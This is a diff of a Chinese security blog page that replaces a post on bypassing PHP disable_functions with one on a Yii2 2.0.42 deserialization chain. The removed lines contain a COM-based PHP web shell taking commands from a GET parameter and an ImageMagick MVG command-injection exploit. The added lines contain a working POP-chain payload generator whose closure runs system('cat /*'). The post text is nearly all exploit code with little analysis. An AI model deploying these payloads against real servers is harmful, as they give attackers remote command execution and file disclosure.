@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="disable_function绕过, 船到桥头自然直">
+    <meta name="keywords" content="yii2.0.42反序列化分析, 船到桥头自然直">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>disable_function绕过 | 船到桥头自然直</title>
+    <title>yii2.0.42反序列化分析 | 船到桥头自然直</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">disable_function绕过</h1>
+                    <h1 class="description center-align post-title">yii2.0.42反序列化分析</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-21
+                    2021-08-25
                 </div>
                 
 
@@ -459,55 +459,68 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="0x01利用系统组件绕过"><a href="#0x01利用系统组件绕过" class="headerlink" title="0x01利用系统组件绕过"></a>0x01利用系统组件绕过</h4><ul>
-<li>php_com_dotent</li>
-</ul>
-<p>需要自己手动添加这个组件。</p>
-<p><img src="/images/128.png"></p>
-<ul>
-<li>exp</li>
-</ul>
+                <h4 id="漏洞链条"><a href="#漏洞链条" class="headerlink" title="漏洞链条"></a><strong>漏洞链条</strong></h4><p><img src="/images/132.png"></p>
+<p><img src="/images/133.png"></p>
+<p><img src="/images/134.png"></p>
+<p><img src="/images/135.png"></p>
+<p><img src="/images/136.png"></p>
+<p>exp</p>
 <pre><code>&lt;?php
-$command=$_GET[&#39;a&#39;];
-$wsh = new COM(&#39;WScript.shell&#39;); // 生成一个COM对象　Shell.Application也能
-$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //调用对象方法来执行命令
-$stdout = $exec-&gt;StdOut();
-$stroutput = $stdout-&gt;ReadAll();
-echo $stroutput;
-?&gt;</code></pre>
-<p><img src="/images/129.png"></p>
-<h4 id="0x02利用ImageMagick漏洞绕过"><a href="#0x02利用ImageMagick漏洞绕过" class="headerlink" title="0x02利用ImageMagick漏洞绕过"></a>0x02利用ImageMagick漏洞绕过</h4><p><img src="/images/130.png"></p>
-<p>利用</p>
-<ul>
-<li>可以用kali的<code>searchsploit imagick</code>查找下是否有已知漏洞可以直接利用</li>
-<li>exp</li>
-</ul>
-<pre><code>&lt;?php
-echo &quot;Disable Functions: &quot; . ini_get(&#39;disable_functions&#39;) . &quot;\n&quot;;
-
-$command = PHP_SAPI == &#39;cli&#39; ? $argv[1] : $_GET[&#39;cmd&#39;];
-if ($command == &#39;&#39;) &#123;
-    $command = &#39;id&#39;;
+namespace Codeception\Extension&#123;
+    use Faker\DefaultGenerator;
+    use GuzzleHttp\Psr7\AppendStream;
+    class  RunProcess&#123;
+        protected $output;
+        private $processes = [];
+        public function __construct()&#123;
+            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
+            $this-&gt;output=new DefaultGenerator(&#39;jiang&#39;);
+        &#125;
+    &#125;
+    echo base64_encode(serialize(new RunProcess()));
 &#125;
 
-$exploit = &lt;&lt;&lt;EOF
-push graphic-context
-viewbox 0 0 640 480
-fill &#39;url(https://example.com/image.jpg&quot;|$command&quot;)&#39;
-pop graphic-context
-EOF;
+namespace Faker&#123;
+    class DefaultGenerator
+&#123;
+    protected $default;
 
-file_put_contents(&quot;KKKK.mvg&quot;, $exploit);
-$thumb = new Imagick();
-$thumb-&gt;readImage(&#39;KKKK.mvg&#39;);
-$thumb-&gt;writeImage(&#39;KKKK.png&#39;);
-$thumb-&gt;clear();
-$thumb-&gt;destroy();
-unlink(&quot;KKKK.mvg&quot;);
-unlink(&quot;KKKK.png&quot;);
-?&gt;</code></pre>
-<h4 id="0x03利用环境变量LD-PRELOAD来绕过"><a href="#0x03利用环境变量LD-PRELOAD来绕过" class="headerlink" title="0x03利用环境变量LD_PRELOAD来绕过"></a>0x03利用环境变量LD_PRELOAD来绕过</h4><p>还没理解懂。。</p>
-<h4 id="0x04利用蚁剑自带功能进行绕过"><a href="#0x04利用蚁剑自带功能进行绕过" class="headerlink" title="0x04利用蚁剑自带功能进行绕过"></a>0x04利用蚁剑自带功能进行绕过</h4><p><img src="/images/131.png"></p>
+    public function __construct($default = null)
+    &#123;
+        $this-&gt;default = $default;
+&#125;
+&#125;
+&#125;
+namespace GuzzleHttp\Psr7&#123;
+    use Faker\DefaultGenerator;
+    final class AppendStream&#123;
+        private $streams = [];
+        private $seekable = true;
+        public function __construct()&#123;
+            $this-&gt;streams[]=new CachingStream();
+        &#125;
+    &#125;
+    final class CachingStream&#123;
+        private $remoteStream;
+        public function __construct()&#123;
+            $this-&gt;remoteStream=new DefaultGenerator(false);
+            $this-&gt;stream=new  PumpStream();
+        &#125;
+    &#125;
+    final class PumpStream&#123;
+        private $source;
+        private $size=-10;
+        private $buffer;
+        public function __construct()&#123;
+            $this-&gt;buffer=new DefaultGenerator(&#39;j&#39;);
+            include(&quot;closure/autoload.php&quot;);
+            $a = function()&#123;system(&#39;cat /*&#39;);phpinfo();    &#125;;
+            $a = \Opis\Closure\serialize($a);
+            $b = unserialize($a);
+            $this-&gt;source=$b;
+        &#125;
+    &#125;
+&#125;</code></pre>
 
             </div>
             <hr/>
@@ -533,7 +546,7 @@ unlink(&quot;KKKK.png&quot;);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/08/21/disable-function%E7%BB%95%E8%BF%87/">http://example.com/2021/08/21/disable-function%E7%BB%95%E8%BF%87/</a>
+                    <a href="http://example.com/2021/08/25/yii2-0-42%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">http://example.com/2021/08/25/yii2-0-42%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -738,9 +751,10 @@ unlink(&quot;KKKK.png&quot;);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/08/25/yii2-0-42%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">
                     <div class="card-image">
@@ -758,9 +772,9 @@ unlink(&quot;KKKK.png&quot;);
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-25
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -769,6 +783,7 @@ unlink(&quot;KKKK.png&quot;);
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -779,13 +794,13 @@ unlink(&quot;KKKK.png&quot;);
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/15/php-filter%E7%9A%84%E5%A6%99%E7%94%A8/">
+                <a href="/2021/08/21/disable-function%E7%BB%95%E8%BF%87/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="php://filter的妙用">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="disable_function绕过">
                         
-                        <span class="card-title">php://filter的妙用</span>
+                        <span class="card-title">disable_function绕过</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -796,7 +811,7 @@ unlink(&quot;KKKK.png&quot;);
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
                             </span>
                         <span class="publish-author">
                             
